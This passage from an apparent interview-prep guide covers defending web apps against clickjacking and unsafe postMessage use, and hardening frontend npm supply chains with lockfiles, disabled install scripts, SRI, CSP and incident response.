"Clickjacking is when an attacker loads our page inside an invisible iframe on their site and positions it so that the user's click on something harmless, like a 'play video' button, actually lands on a sensitive button on our page, such as 'confirm transfer' or 'grant access'. The user is logged in, so the action succeeds.

The fix is to tell the browser who is allowed to frame us. The modern way is the CSP directive `frame-ancestors`. For most apps that's `frame-ancestors 'none'` or `'self'`. If partners embed us, we list them explicitly. I'd also send `X-Frame-Options: DENY` for older browsers. JavaScript frame-busting scripts aren't reliable, because the attacker can sandbox the iframe and stop them running. SameSite cookies also help, because a cross-site frame won't get the session cookie with Lax or Strict.

When we embed other people's content, I flip it around and limit what the frame can do. An iframe with an empty `sandbox` attribute can't run scripts, submit forms, open popups or navigate our top window. I add back only what's needed, for example `allow-scripts allow-popups` for a video embed. I never give same-origin content both `allow-scripts` and `allow-same-origin`, because it can then just remove the sandbox. For user-generated HTML, like rendered previews, I serve it from a completely separate domain, the way Google uses `googleusercontent.com`, so even if a script runs, it can't reach our cookies or DOM.

For communication between frames or windows, `postMessage` is the right tool, but both ends need care. When sending, I pass the exact target origin, never `'*'`, otherwise a different page in that frame could receive tokens or user data. When receiving, I check `event.origin` against an exact allowlist using strict equality, check `event.source` is the frame I created, and validate the message shape before acting on it. The classic bug is `if (event.origin.includes('ourapp.com'))`, which `ourapp.com.attacker.io` passes.

Finally, for links that open new tabs, I make sure `noopener` is set, so the new page can't redirect our tab to a phishing page through `window.opener`. For high-value apps I'd also set `Cross-Origin-Opener-Policy: same-origin`."

#### Another worked example
**A secure parent/iframe handshake (e.g. an embedded payment or support widget):**
```ts
// Parent page (app.example.com)
const WIDGET_ORIGIN = 'https://widget.vendor.com';
const frame = document.querySelector<HTMLIFrameElement>('#widget')!;

window.addEventListener('message', (event) => {
  if (event.origin !== WIDGET_ORIGIN) return;           // exact match only
  if (event.source !== frame.contentWindow) return;      // from our frame, not another
  const msg = WidgetMessage.safeParse(event.data);       // zod schema
  if (!msg.success) return;
  if (msg.data.type === 'resize') frame.style.height = msg.data.height + 'px';
  if (msg.data.type === 'paid') showReceipt(msg.data.orderId);
});

frame.addEventListener('load', () => {
  frame.contentWindow!.postMessage({ type: 'init', theme: 'dark' }, WIDGET_ORIGIN);
});
```
The widget side does the same in reverse: checks the parent's origin against the merchant's registered domains, and sends with an explicit target origin. Server-side, `paid` should be confirmed through a webhook, never trusted from the browser message alone.

#### A third worked example
**Letting customers embed your dashboard.** A B2B analytics product wants customers to embed charts in their internal tools. Approach:
- Per-customer `frame-ancestors` list, generated dynamically from the customer's configured domains (`frame-ancestors https://intranet.acme.com`).
- Embed-specific short-lived signed URLs or tokens instead of relying on session cookies, since third-party cookies are blocked in many browsers.
- A read-only embed mode with no destructive actions, so clickjacking has nothing to target.
- A `postMessage` API with an origin allowlist that matches the same customer domains.

#### Step-by-step framework
1. **Define clickjacking** and give a concrete attack.
2. **Block framing by default** with `frame-ancestors` and `X-Frame-Options`.
3. **Allow specific embedders** explicitly when the product needs it.
4. **Sandbox embedded content**, adding only needed permissions; restrict powerful features with `allow`.
5. **Isolate user content** on a separate origin.
6. **Secure `postMessage`**: exact target origin, exact origin check, source check, schema validation.
7. **Protect against opener attacks**: `noopener`, COOP.
8. **Verify** with headers checks in CI and security scanners.

#### Strong versus weak answer
| Weak | Strong |
|---|---|
| JavaScript frame-busting | CSP `frame-ancestors` plus `X-Frame-Options` |
| `postMessage(data, '*')` | Exact target origin |
| `if (e.origin.includes('example.com'))` | `e.origin === ALLOWED` and `e.source` check, plus schema |
| `sandbox="allow-scripts allow-same-origin"` on same-origin content | Minimal sandbox flags and a separate origin for user content |
| Unaware of `window.opener` | `noopener`, COOP for sensitive apps |

#### Useful phrases
- "By default nobody frames us; embedding is an explicit allowlist."
- "Sandbox first, then add back only what the embed needs."
- "Every message is untrusted input until origin, source and shape are checked."
- "User content lives on a different origin, so its scripts can't reach ours."

#### Common pitfalls
- Setting `frame-ancestors` in a **`<meta>` tag**: it's ignored there; it must be a response header.
- Forgetting to send headers on **every route**, including error pages and the login page.
- **Loose origin checks** with `includes`, `startsWith` or unanchored regexes.
- **Sending secrets via `postMessage`** to `'*'`.
- Trusting payment or permission results from a **browser message** rather than a server confirmation.
- Breaking legitimate embeds (e.g. OAuth popups) with an overly strict COOP without testing; `same-origin-allow-popups` exists for that case.

#### Follow-ups to expect (with sample answers)
- **"Why isn't frame-busting JavaScript enough?"** — "An attacker can use `sandbox` without `allow-top-navigation`, so the script can't navigate the top window, or block scripts entirely. Only the browser-enforced header is reliable."
- **"What's double-clickjacking?"** — "A newer variant where the attacker swaps windows between the two clicks of a double-click, so the second click lands on a sensitive button in another window. Framing headers don't stop it, so sensitive buttons can require a short delay or deliberate pointer movement before activating."
- **"How do you safely show user-uploaded HTML or SVG?"** — "Serve it from a sandboxed separate domain with `Content-Disposition` or a strict CSP, or sanitise it. SVG can contain scripts, so treat it like HTML."
- **"What does COOP actually do?"** — "It separates our window from cross-origin windows that open or are opened by us, so they get no reference to each other. That stops cross-window attacks and side-channel leaks, and with COEP enables cross-origin isolation."
- **"How would you test for clickjacking?"** — "Try to load the page in an iframe on a different origin and check it's refused; check headers with a scanner like ZAP or securityheaders.com in CI."

#### What senior interviewers look for
- **Default-deny** thinking for framing and embedding.
- **Precise `postMessage` hygiene**, including source and schema checks.
- Knowing **architectural isolation**: separate origins for untrusted content.
- Balancing security with **product needs** like partner embeds and OAuth popups.

#### Practise it
- Build a parent page and an iframe on another port that exchange messages, then try to attack the receiver with a third page.
- Add `frame-ancestors` and check a cross-origin frame is blocked.
- Checklist: framing header · explicit embed allowlist · minimal sandbox · separate origin for user content · exact `postMessage` origins · `noopener` · server confirmation for important events.

#### Variations you might be asked
- "How would you build an embeddable widget that customers put on their sites?"
- "What headers would you set on every response for a banking app?"
- "Why does Google serve user content from a different domain?"

## Frontend supply-chain security: npm dependencies
- id: fe-sec-05
- roles: frontend, fullstack
- round: SECURITY
- difficulty: medium
- levels: senior, staff
- tags: security, supply chain, npm, dependencies, lockfiles, SRI, third-party scripts

### Prompt
A typical frontend app has over a thousand transitive npm dependencies, plus third-party scripts loaded at runtime. What are the supply-chain risks, and how would you reduce them for a team or organisation?

### Answer
#### What the interviewer is really testing
- Understanding that **every dependency runs with your privileges**: at install time (scripts on developer machines and CI) and at runtime (in users' browsers, in your origin).
- Knowing the **attack types**: compromised maintainer accounts, malicious updates, typosquatting, dependency confusion, protestware, abandoned packages.
- Practical controls: **lockfiles and `npm ci`**, pinning, **install scripts disabled**, delayed adoption of new versions, auditing, provenance.
- Controlling **runtime third-party scripts**: CSP, **Subresource Integrity (SRI)**, self-hosting, tag manager governance.
- Thinking at **organisation level**: policies, private registries, ownership, incident response.

#### Key points
- **Two blast zones:**
  - **Install/build time:** `preinstall`/`postinstall` scripts run arbitrary code on developer laptops and CI, which hold SSH keys, cloud credentials and npm publish tokens.
  - **Runtime:** bundled code runs in your origin in every user's browser, with access to the DOM, cookies sent with requests, form inputs (card numbers, passwords).
- **Real attack patterns:**
  - **Account takeover / malicious release** of a popular package (event-stream 2018, ua-parser-js 2021, the 2025 wave of phished maintainer accounts that pushed malicious versions of widely used packages, including self-spreading worms that stole tokens).
  - **Typosquatting:** `reactt`, `lodahs`, `crossenv`.
  - **Dependency confusion:** a public package with the same name as your internal one, with a higher version, gets installed instead.
  - **Protestware or sabotage** by the real maintainer (colors/faker, node-ipc).
  - **Compromised CDN or third-party script** (Polyfill.io 2024: the domain changed owners and served malware to sites that loaded it).
  - **Magecart-style skimming:** injected scripts that read checkout forms.
- **Controls for dependencies:**
  - **Commit the lockfile**; use `npm ci` / `pnpm install --frozen-lockfile` in CI, so builds only install reviewed, exact versions.
  - **Disable install scripts by default** (`ignore-scripts=true`, or pnpm's allowlist of packages allowed to run build scripts).
  - **Delay new versions**: a minimum release age (e.g. pnpm `minimumReleaseAge`, Renovate `minimumReleaseAge: 3 days`), because most malicious versions are found and pulled within hours or days.
  - **Automated updates with review** (Renovate or Dependabot), grouped and tested, rather than never updating or auto-merging everything.
  - **Scanning:** `npm audit`, Socket, Snyk, GitHub dependency review, which flag known CVEs and suspicious behaviour (new install scripts, network access, obfuscation).
  - **Provenance and signatures:** `npm audit signatures`, packages published with npm provenance from CI; trusted publishing for your own packages.
  - **Scoped private registry** for internal packages (`@acme/*` mapped to your registry) to prevent dependency confusion.
  - **Fewer dependencies:** question tiny packages; the platform now covers many (`structuredClone`, `Intl`, `fetch`, `Array.prototype.at`).
- **Controls for runtime third-party scripts:**
  - **Self-host** where possible, so a third party's domain can't change what you serve.
  - **SRI** for CDN scripts: `<script src="..." integrity="sha384-..." crossorigin="anonymous">`; the browser refuses a modified file.
  - **CSP** limiting script sources and `connect-src` (where data can be sent), which limits exfiltration.
  - **Govern tag managers**: they let marketing inject arbitrary JavaScript in production; restrict who can publish and keep them off sensitive pages like checkout.
  - Isolate payment fields in provider-hosted iframes (Stripe Elements), so your page's scripts can't read card data. PCI DSS v4 now requires inventory and integrity checks for payment-page scripts.

#### Model answer
"I think about supply-chain risk in two places. At install time, any package with a postinstall script can run arbitrary code on developer machines and CI, where we have cloud credentials and publish tokens. At runtime, everything in our bundle runs in our origin in every user's browser, so a malicious package can read form fields, including passwords and card numbers, and make requests as the user.

The attacks are real and recent: maintainer accounts get phished and malicious versions published, sometimes worms that steal npm tokens and republish more packages; typosquats; dependency confusion against internal package names; and third-party CDNs changing hands, like Polyfill.io.

My controls, roughly in order of value:

First, reproducible installs: the lockfile is committed and reviewed, and CI uses `npm ci` or `pnpm install --frozen-lockfile`, so nothing changes without a PR.

Second, don't run install scripts by default. pnpm makes this easy with an allowlist of packages permitted to run build scripts, like `esbuild`.

Third, don't adopt brand-new versions immediately. A minimum release age of a few days in Renovate and in the package manager means most malicious releases are caught and unpublished before they reach us. Updates still flow regularly, grouped, through CI, so we don't fall years behind, which is its own risk.

Fourth, scanning in the PR: dependency review that flags known vulnerabilities, plus a behavioural scanner like Socket that flags new install scripts, network calls or obfuscated code in an update.

Fifth, reduce the surface: challenge new dependencies in review. Does it need a package, is it maintained, how many transitive dependencies does it bring?

For internal packages, everything lives under our scope pointing to our private registry, which prevents dependency confusion.

For runtime scripts, I prefer self-hosting; when we must load from a CDN, we use Subresource Integrity, so a changed file is refused. Our CSP restricts script sources and, importantly, `connect-src`, so even injected code has trouble sending data out. Tag managers are kept off sensitive pages like checkout and login, and card fields live in the payment provider's iframe so our own scripts never see card numbers.

And finally, we plan for the day it happens: an SBOM so we can answer 'are we affected?' within minutes, and a runbook for rotating secrets and rebuilding."

#### Another worked example
**Responding to a compromised package alert.** A widely used package published a malicious patch version yesterday that steals environment variables during `postinstall`.
1. **Are we affected?** Search lockfiles across repos (or the SBOM) for the bad version: `pnpm why bad-pkg`, or `grep` the lockfiles.
2. **Did it run?** Check CI logs and dates: if `ignore-scripts` was on, or our minimum release age blocked it, we're likely safe.
3. **If it ran:** treat every secret on affected machines and CI runners as compromised. Rotate npm tokens, cloud keys and GitHub tokens; check for unexpected publishes or workflow changes.
4. **Pin to a safe version**, regenerate the lockfile, and rebuild and redeploy if it reached a bundle.
5. **Post-incident:** add the controls that would have prevented it.

#### A third worked example
**Hardening a checkout page against skimming.**
```http
Content-Security-Policy: script-src 'nonce-{random}' 'strict-dynamic';
  connect-src 'self' https://api.stripe.com; frame-src https://js.stripe.com;
  object-src 'none'; base-uri 'none'
```
- Card input lives in Stripe's iframe, so even a compromised script on our page can't read it.
- `connect-src` limits where scripts can send data, so a skimmer can't post to `evil-cdn.io`.
- No tag manager or chat widget on the checkout route.
- A script inventory with integrity monitoring (PCI DSS 6.4.3 and 11.6.1), alerting if the set of scripts on the payment page changes.

#### Step-by-step framework
1. **Map the attack surface**: install-time scripts, bundled code, runtime third-party scripts.
2. **Make installs reproducible**: lockfiles, frozen installs in CI.
3. **Block install scripts** except an explicit allowlist.
4. **Delay and review updates**: minimum release age, grouped automated PRs.
5. **Scan** for CVEs and suspicious behaviour in PRs.
6. **Prevent dependency confusion** with scoped private registries.
7. **Control runtime scripts**: self-host, SRI, CSP with `connect-src`, tag manager governance.
8. **Prepare for incidents**: SBOM, secret rotation runbook, least-privilege CI tokens.

#### Strong versus weak answer
| Weak | Strong |
|---|---|
| "We run `npm audit`" | Lockfiles, frozen installs, no install scripts, release-age delay, behavioural scanning |
| Auto-merge every update immediately | Regular grouped updates with a minimum release age and CI |
| Never update, to be "safe" | Knows stale dependencies carry known CVEs |
| Loads third-party scripts from CDNs freely | Self-hosting, SRI, CSP, tag governance |
| No plan for an incident | SBOM, runbook, secret rotation, scoped tokens |

#### Useful phrases
- "Every dependency is code we've decided to trust with our users' data."
- "Install scripts are remote code execution on our laptops and CI, so they're off by default."
- "Most malicious releases are pulled within days, so we let new versions age before adopting them."
- "`connect-src` is our last line: even injected code needs somewhere to send the data."

#### Common pitfalls
- **No lockfile, or `npm install` in CI**, so builds pull new versions silently.
- **Long-lived npm and cloud tokens** in CI with broad scopes.
- Treating **`npm audit` noise** as the whole story; it only knows about published CVEs, not fresh malware.
- **Loading scripts from a third-party domain without SRI**, trusting that domain forever.
- Adding a dependency for a **one-line utility**.
- Letting a **tag manager** inject scripts on login or payment pages.

#### Follow-ups to expect (with sample answers)
- **"Why can't SRI be used with tag managers or analytics scripts?"** — "Those files change frequently by design, so a fixed hash would break. That's why self-hosting a pinned version or restricting them with CSP and keeping them off sensitive pages matters."
- **"What's dependency confusion?"** — "If your build looks up `acme-utils` and the public registry has a higher version than your private one, a misconfigured resolver installs the public, attacker-controlled one. Scoped names bound to your private registry prevent it."
- **"What's an SBOM, and why does it matter?"** — "A software bill of materials listing every component and version. When a compromise is announced, you can answer 'which apps ship this version?' in minutes instead of days."
- **"How do you protect your own published packages?"** — "Two-factor or passkeys for maintainers, trusted publishing from CI with OIDC instead of long-lived tokens, npm provenance, and protected release branches."
- **"How do you decide whether to add a dependency?"** — "Is it maintained and widely used, how many transitive dependencies does it add, what's its size, does it have install scripts, and could we write the part we need in under 50 lines?"

#### What senior interviewers look for
- **Systems thinking** across developer machines, CI, bundles and runtime scripts.
- Up-to-date awareness of **recent attacks** and current tooling.
- **Pragmatism**: staying current without adopting fresh releases blindly.
- Ability to set **organisation-wide policy** and run an incident.

#### Practise it
- Audit a project: count transitive dependencies, list packages with install scripts, check whether CI uses a frozen install.
- Configure Renovate with grouping and a minimum release age, and pnpm with a build-script allowlist.
- Checklist: lockfile · frozen installs · scripts off · release-age delay · PR scanning · scoped private registry · SRI/self-hosting · CSP `connect-src` · SBOM · rotation runbook.

#### Variations you might be asked
- "A popular package you depend on was just compromised. Walk me through your response."
- "How do you protect a payment page from malicious scripts?"
- "Should we use a CDN for third-party libraries or bundle them?"
